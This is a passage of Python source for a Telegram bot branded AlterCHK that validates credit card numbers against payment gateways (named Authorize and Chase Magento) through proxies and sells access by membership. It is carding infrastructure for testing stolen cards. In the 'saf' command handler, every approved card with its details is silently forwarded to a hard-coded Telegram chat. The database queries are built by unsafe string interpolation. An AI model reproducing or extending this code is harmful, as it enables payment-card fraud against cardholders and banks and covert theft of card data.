                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDod import AuthorizeCCN
        CheckRecive = await AuthorizeCCN(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["saf"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Safire [ 8$ ]'
    TwoNameGateway = 'Gateway ↯ Safire [ 8$ ]'
    ThreeGateway = 'Gateway 🔥 Safire [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('saf')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This Gateway only accepts Visa and Mastercard.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDsaf import ChaseMagento
        CheckRecive = await ChaseMagento(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
            await bot.send_message(chat_id=5673835413, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ph"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Phoenix [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Phoenix [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Phoenix [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ph')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
